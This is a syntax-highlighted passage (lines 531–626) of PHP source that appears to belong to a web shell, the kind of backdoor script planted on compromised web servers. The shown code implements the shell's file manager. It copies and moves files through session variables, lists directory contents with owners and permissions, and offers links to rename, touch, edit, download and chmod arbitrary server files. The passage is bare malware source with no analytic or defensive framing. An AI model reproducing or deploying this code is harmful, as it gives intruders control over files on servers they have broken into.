<span class="lineno"> 531</span>                             <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 532</span>                         <span class="p">}</span> 
<span class="lineno"> 533</span>                     <span class="p">}</span> 
<span class="lineno"> 534</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 535</span>                         <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">],</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>                     
<span class="lineno"> 536</span>                 <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 537</span>                     <span class="k">function</span> <span class="nf">move_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span> 
<span class="lineno"> 538</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span> 
<span class="lineno"> 539</span>                             <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 540</span>                             <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 541</span>                             <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 542</span>                                 <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 543</span>                                     <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
<span class="lineno"> 544</span>                                 <span class="p">}</span> 
<span class="lineno"> 545</span>                         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 546</span>                             <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 547</span>                         <span class="p">}</span> 
<span class="lineno"> 548</span>                     <span class="p">}</span> 
<span class="lineno"> 549</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 550</span>                         <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 551</span>                 <span class="p">}</span> 
<span class="lineno"> 552</span>                 <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span> 
<span class="lineno"> 553</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 554</span>             <span class="k">default</span><span class="o">:</span> 
<span class="lineno"> 555</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 556</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span> 
<span class="lineno"> 557</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span> 
<span class="lineno"> 558</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 559</span>                         <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 560</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span> 
<span class="lineno"> 561</span>                 <span class="p">}</span> 
<span class="lineno"> 562</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 563</span>         <span class="p">}</span> 
<span class="lineno"> 564</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;script&gt;document.mf.p1.value=&quot;&quot;;document.mf.p2.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 565</span>     <span class="p">}</span> 
<span class="lineno"> 566</span>     <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">:</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 567</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t open this folder!&#39;</span><span class="p">;</span> <span class="k">return</span><span class="p">;</span>    <span class="p">}</span>
<span class="lineno"> 568</span>     <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span> 
<span class="lineno"> 569</span>     <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 570</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 571</span>         <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> 
<span class="lineno"> 572</span>             <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> 
<span class="lineno"> 573</span>     <span class="p">}</span> 
<span class="lineno"> 574</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 575</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 576</span> <span class="x">    function sa() { </span>
<span class="lineno"> 577</span> <span class="x">        for(i=0;i&lt;document.files.elements.length;i++) </span>
<span class="lineno"> 578</span> <span class="x">            if(document.files.elements[i].type == &#39;checkbox&#39;) </span>
<span class="lineno"> 579</span> <span class="x">                document.files.elements[i].checked = document.files.elements[0].checked; </span>
<span class="lineno"> 580</span> <span class="x">    } </span>
<span class="lineno"> 581</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 582</span> <span class="x">&lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;&gt; </span>
<span class="lineno"> 583</span> <span class="x">&lt;form name=files method=post&gt; </span>
<span class="lineno"> 584</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 585</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;th width=&#39;13px&#39;&gt;&lt;input type=checkbox onclick=&#39;sa()&#39; class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_name_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_size_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_modify_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_perms_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 586</span>     <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="nv">$links</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 587</span>     <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span> 
<span class="lineno"> 588</span>     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 589</span>         <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span> 
<span class="lineno"> 590</span>         <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span> 
<span class="lineno"> 591</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> 
<span class="lineno"> 592</span>                      <span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> 
<span class="lineno"> 593</span>                      <span class="s1">&#39;modify&#39;</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span> 
<span class="lineno"> 594</span>                      <span class="s1">&#39;perms&#39;</span> <span class="o">=&gt;</span> <span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
<span class="lineno"> 595</span>                      <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> 
<span class="lineno"> 596</span>                      <span class="s1">&#39;owner&#39;</span> <span class="o">=&gt;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> 
<span class="lineno"> 597</span>                      <span class="s1">&#39;group&#39;</span> <span class="o">=&gt;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> 
<span class="lineno"> 598</span>                     <span class="p">);</span> 
<span class="lineno"> 599</span>         <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> 
<span class="lineno"> 600</span>             <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span> 
<span class="lineno"> 601</span>         <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> 
<span class="lineno"> 602</span>             <span class="nv">$links</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;link&#39;</span><span class="p">));</span> 
<span class="lineno"> 603</span>         <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span> 
<span class="lineno"> 604</span>             <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 605</span>     <span class="p">}</span> 
<span class="lineno"> 606</span>     <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span> 
<span class="lineno"> 607</span>     <span class="k">function</span> <span class="nf">cmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 608</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span> 
<span class="lineno"> 609</span>             <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]])</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 610</span>         <span class="k">else</span> 
<span class="lineno"> 611</span>             <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 612</span>     <span class="p">}</span> 
<span class="lineno"> 613</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 614</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 615</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$links</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 616</span>     <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$links</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span> 
<span class="lineno"> 617</span>     <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 618</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 619</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;tr&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$l</span><span class="o">?</span><span class="s1">&#39; class=l1&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&lt;td&gt;&lt;input type=checkbox name=&quot;f[]&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot; class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&gt;&lt;b&gt;[ &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; ]&lt;/b&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span><span class="o">:</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span> 
<span class="lineno"> 620</span>             <span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&gt;R&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&gt;T&lt;/a&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&gt;E&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&gt;D&lt;/a&gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 621</span>         <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno"> 622</span>     <span class="p">}</span> 
<span class="lineno"> 623</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 624</span> <span class="x">    &lt;tr&gt;&lt;td colspan=7&gt; </span>
<span class="lineno"> 625</span> <span class="x">    &lt;input type=hidden name=a value=&#39;FilesMan&#39;&gt; </span>
<span class="lineno"> 626</span> <span class="x">    &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
